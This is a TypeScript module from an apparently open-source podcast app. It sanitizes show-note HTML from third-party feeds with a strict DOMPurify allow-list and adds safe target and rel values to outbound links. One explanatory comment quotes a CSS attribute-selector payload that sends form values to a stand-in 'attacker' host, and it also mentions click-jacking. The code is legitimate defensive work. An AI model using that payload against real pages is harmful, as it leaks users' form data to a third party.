// SPDX-License-Identifier: AGPL-3.0-or-later
// SPDX-FileCopyrightText: 2026 The Mosaicast Authors

import DOMPurify, { type Config } from 'dompurify';
import { FEED_HTML_POLICY } from '@mosaicast/plugin-sdk';

/**
 * Sanitizes HTML that came from a feed — show notes and channel descriptions.
 *
 * **Whose HTML this is.** Whatever the podcast host publishes. Not the operator's, not the shell's: a feed is
 * fetched from a third party over the network and rendered with `dangerouslySetInnerHTML`. It is the one
 * place on the site where markup arrives from outside and is inserted as markup.
 *
 * **Why an explicit allow-list rather than DOMPurify's defaults.** The defaults are built to be safe against
 * *script execution*, and they are — but they permit the `style` attribute and the `<style>` element, filtering
 * CSS only for `expression()` and `behavior:`, not for `url()`. Combined with `style-src 'unsafe-inline'` in
 * the response CSP — which the plugin UI contract requires, because Web Components style their shadow roots
 * (see `PluginCspHeaderWriter`) — that made feed HTML a working stylesheet on the episode page. The reachable
 * consequences are not theoretical: `input[value^="a"]{background-image:url(https://attacker/a)}` exfiltrates
 * rendered form values one character at a time, and a fixed, full-viewport, high-z-index block is
 * click-jacking. `img-src` allows any `https:` origin, because artwork legitimately comes from arbitrary feed
 * hosts, so the outbound request that carries the stolen value is permitted too.
 *
 * Closing it here rather than in the CSP is deliberate. Dropping `'unsafe-inline'` would break every plugin
 * that styles itself; removing styling from *feed HTML* costs a publisher nothing they should have been doing.
 * Show notes are prose, links, lists and images — the tags below — and a podcast host that needs a stylesheet
 * to render its episode description is doing something the shell should not honour anyway.
 *
 * The allow-list is deliberately narrow and additive: adding a tag is a decision someone makes on purpose,
 * whereas inheriting a default profile is a decision nobody made.
 *
 * **The lists live in the SDK** (`FEED_HTML_POLICY`, platformApi 0.16.0), because plugins render the same
 * class of content through `ctx.sanitize` — and a plugin must not be able to end up with a weaker policy
 * than the shell by writing less code (the wiki plugin shipped DOMPurify's defaults, and was defaced with
 * exactly the `<style>` block described above). One copy, imported here, means the shell and every plugin
 * apply the same decision and cannot drift. `FORBID_*` is belt and braces: those names are already absent
 * from the allow-lists, but naming them means a future edit that widens one cannot quietly re-open the hole.
 */
/**
 * The allowed attributes whose values are not URLs.
 *
 * DOMPurify checks every attribute it does not already know to be URI-safe against `ALLOWED_URI_REGEXP`,
 * not only `href` and `src`. With the policy's regexp — a scheme, `#` or `/` — that silently removed `lang`,
 * `dir`, `width`, `height`, `colspan` and `rowspan` from all feed HTML, since `"de"` and `"10"` are not URLs,
 * although the allow-list names every one of them and the SDK test kit keeps them (core#232). Declaring the
 * non-URL half URI-safe is what makes the allow-list mean what it says; `href` and `src` stay checked.
 */
const NON_URI_ATTRS = FEED_HTML_POLICY.allowedAttrs.filter((name) => name !== 'href' && name !== 'src');

const FEED_HTML: Config = {
  ALLOWED_TAGS: [...FEED_HTML_POLICY.allowedTags],
  ALLOWED_ATTR: [...FEED_HTML_POLICY.allowedAttrs],
  FORBID_TAGS: [...FEED_HTML_POLICY.forbidTags],
  FORBID_ATTR: [...FEED_HTML_POLICY.forbidAttrs],
  // `javascript:` and `data:` in an href; DOMPurify's URI check handles the rest.
  ALLOWED_URI_REGEXP: FEED_HTML_POLICY.allowedUriRegexp,
  ADD_URI_SAFE_ATTR: NON_URI_ATTRS,
  // DOMPurify keeps every `data-*` and `aria-*` attribute by default, independently of `ALLOWED_ATTR`, so the
  // allow-list above was not the whole list. `allowedAttrs` is documented as every attribute that survives,
  // and the SDK test kit applies it that way; production kept `data-wiki` on an author's link, which a plugin
  // delegating clicks on `a[data-wiki]` cannot tell from its own markup (core#232). Off, so the list is the
  // policy. Should feed HTML ever need `aria-*`, it goes into `FEED_HTML_POLICY`, where the kit sees it too.
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
};

/**
 * What a link leaving the site carries. The same string the server writes into the no-JS copy of the same
 * show notes (`ExternalLinks.REL`), so one episode's links are not endorsed on one rendering and not the
 * other (core#169).
 *
 * - `noopener noreferrer` — mandatory with `target="_blank"`: without it the opened page gets a handle on
 *   this one, and the podcast host learns which episode page its visitor came from.
 * - `nofollow ugc` — this markup is a third party's, published through the operator's site, not written by
 *   the operator; it is the same statement jsoup's `Safelist.basic()` already made on the server side.
 */
export const EXTERNAL_LINK_REL = FEED_HTML_POLICY.externalLinkRel;

/**
 * Sends every link that leaves the site to a new tab.
 *
 * **`target="_blank"` is the playback guarantee, not a preference.** Show notes link to a publisher's own
 * site, and following one in this tab is a full navigation: the SPA is torn down and the audio element with
 * it — the one interruption the persistent player exists to prevent (§6.2), triggered by the most ordinary
 * thing a listener does on an episode page. A new tab is the only way to read what the podcaster linked to
 * and keep listening.
 *
 * Same-origin links are left alone — {@link useRoutedLinks} hands them to the router, which keeps playback
 * just as well and stays in this tab where an internal link belongs. `mailto:` and `tel:` hand off to another
 * application and never replace the page. Whatever `target` or `rel` the feed supplied never survives:
 * neither is in `ALLOWED_ATTR`, and this runs after that filter, so only what is set here remains.
 */
function markExternalLinks(node: Element): void {
  if (node.nodeName !== 'A' || !node.hasAttribute('href')) {
    return;
  }
  let url: URL;
  try {
    url = new URL(node.getAttribute('href') ?? '', window.location.href);
  } catch {
    return;
  }
  if ((url.protocol === 'http:' || url.protocol === 'https:') && url.origin !== window.location.origin) {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', EXTERNAL_LINK_REL);
  }
}

/** Sanitizes feed-supplied HTML for rendering. Returns an empty string for absent or empty input. */
export function sanitizeFeedHtml(html: string | null | undefined): string {
  if (!html) {
    return '';
  }
  // Registered for this call only. DOMPurify's hooks are global, and a hook left installed would rewrite the
  // links of whatever else is ever sanitized in this realm — policy for feed HTML, applied to everything.
  DOMPurify.addHook('afterSanitizeAttributes', markExternalLinks);
  try {
    // `RETURN_TRUSTED_TYPE` is off, so this is a string — the overload cannot prove it from a Config value.
    return DOMPurify.sanitize(html, FEED_HTML) as unknown as string;
  } finally {
    DOMPurify.removeHook('afterSanitizeAttributes');
  }
}
